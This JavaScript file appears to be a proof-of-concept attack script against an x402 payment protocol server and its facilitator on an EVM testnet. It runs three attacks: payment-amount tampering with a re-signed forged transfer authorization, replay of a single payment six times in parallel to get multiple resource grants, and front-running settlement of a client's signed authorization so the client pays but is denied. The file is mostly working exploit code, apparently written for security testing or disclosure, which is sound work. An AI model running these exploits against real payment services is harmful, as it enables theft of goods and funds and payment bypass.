import { x402HTTPClient } from "@x402/core/http";
import { x402Client } from "@x402/core/client";
import { ExactEvmScheme } from "@x402/evm/exact/client";
import { privateKeyToAccount } from "viem/accounts";
import { POC_PRIVATE_KEY } from "./key.mjs";
const SRV = process.env.SRV, FAC = process.env.FAC;
const account = privateKeyToAccount(POC_PRIVATE_KEY);
const client = new x402Client(); client.register("eip155:*", new ExactEvmScheme(account));
const hc = new x402HTTPClient(client);
async function buy(path) {
  const c = await fetch(`${SRV}${path}`); const b = await c.json();
  const pr = hc.getPaymentRequiredResponse(n => c.headers.get(n), b);
  const payload = await hc.createPaymentPayload(pr);
  return { pr, payload, headers: hc.encodePaymentSignatureHeader(payload) };
}
const F = (t) => console.log(`\n${"─".repeat(74)}\n${t}\n${"─".repeat(74)}`);

F("E) AMOUNT TAMPERING — both directions (expect rejection)");
{
  // E1: claim a smaller 'accepted' amount than the route requires
  const { payload } = await buy("/api/cheap");
  payload.accepted = { ...payload.accepted, amount: "1" };
  const h = hc.encodePaymentSignatureHeader(payload);
  let r = await fetch(`${SRV}/api/cheap`, { headers: h });
  console.log(`E1 accepted.amount lowered to 1  -> HTTP ${r.status} (${r.status === 200 ? "BYPASS" : "rejected"})`);

  // E2: keep accepted=10000 but sign value=1  (forged cheap payment for a dear route)
  const { payload: p2 } = await buy("/api/cheap");
  p2.accepted = { ...p2.accepted, amount: "10000", payTo: p2.accepted.payTo };
  // re-sign with value 1 by rebuilding typed data
  const { privateKeyToAccount: pka } = await import("viem/accounts");
  const acct = pka(POC_PRIVATE_KEY);
  const auth = { ...p2.payload.authorization, value: "1" };
  const signature = await acct.signTypedData({
    domain: { name: p2.accepted.extra.name, version: p2.accepted.extra.version, chainId: 84532, verifyingContract: p2.accepted.asset },
    types: { TransferWithAuthorization: [
      {name:"from",type:"address"},{name:"to",type:"address"},{name:"value",type:"uint256"},
      {name:"validAfter",type:"uint256"},{name:"validBefore",type:"uint256"},{name:"nonce",type:"bytes32"}]},
    primaryType: "TransferWithAuthorization", message: { ...auth, value: BigInt(1) },
  });
  p2.payload = { authorization: auth, signature };
  r = await fetch(`${SRV}/api/cheap`, { headers: hc.encodePaymentSignatureHeader(p2) });
  console.log(`E2 signature value=1 but claim amount=10000 -> HTTP ${r.status} (${r.status === 200 ? "BYPASS" : "rejected"})`);
}

F("F) MULTI-GRANT — one payment replayed 6x against a facilitator without authoritative on-chain enforcement");
{
  const { headers } = await buy("/api/cheap");
  const rs = await Promise.all(Array.from({ length: 6 }, () => fetch(`${SRV}/api/cheap`, { headers })));
  const codes = rs.map(r => r.status);
  console.log(`statuses: ${JSON.stringify(codes)}`);
  console.log(`RESOURCE GRANTS FOR ONE PAYMENT: ${codes.filter(c => c === 200).length}`);
  const st = await fetch(`${SRV}/stats`).then(r => r.json());
  console.log(`handler executions: ${st.handlerRuns.cheap}`);
}

F("G) SETTLEMENT PREEMPTION — a third party settles the client's signed authorization first");
{
  const { payload, pr } = await buy("/api/cheap");
  const body = JSON.stringify({ paymentPayload: payload, paymentRequirements: pr.accepts[0] });
  // attacker (anyone who saw the PAYMENT-SIGNATURE header) settles directly:
  const a = await fetch(`${FAC}/settle`, { method: "POST", headers: { "content-type": "application/json" }, body });
  console.log(`attacker settles the header directly -> ${JSON.stringify(await a.json())}`);
  // now the legitimate client tries to use the payment at the merchant:
  const r = await fetch(`${SRV}/api/cheap`, { headers: hc.encodePaymentSignatureHeader(payload) });
  console.log(`legitimate client's request afterwards -> HTTP ${r.status} ${r.status === 402 ? "(paid-but-denied)" : ""}`);
}
